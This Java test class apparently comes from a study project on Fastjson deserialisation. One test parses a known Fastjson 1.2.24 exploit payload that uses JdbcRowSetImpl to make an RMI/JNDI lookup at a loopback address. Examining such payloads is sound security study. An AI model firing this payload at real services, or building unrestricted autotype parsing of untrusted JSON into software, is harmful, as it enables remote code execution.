package com.endlessshw.fastjsonprinciple;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;

@SpringBootTest
class FastjsonPrincipleApplicationTests {

    @Test
    void contextLoads() {
    }


    @Test
    public void testFastjson() {
        String json = "{\"@type\":\"com.endlessshw.fastjsonprinciple.bean.User\",\"username\":\"admin\",\"password\":\"123456\"}";
        JSONObject jsonObject = JSON.parseObject(json);
        System.out.println(jsonObject);
    }

    @Test
    public void testFastjson1_2_24() {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"AutoCommit\":false}";
        JSONObject jsonObject = JSON.parseObject(payload);
    }
}
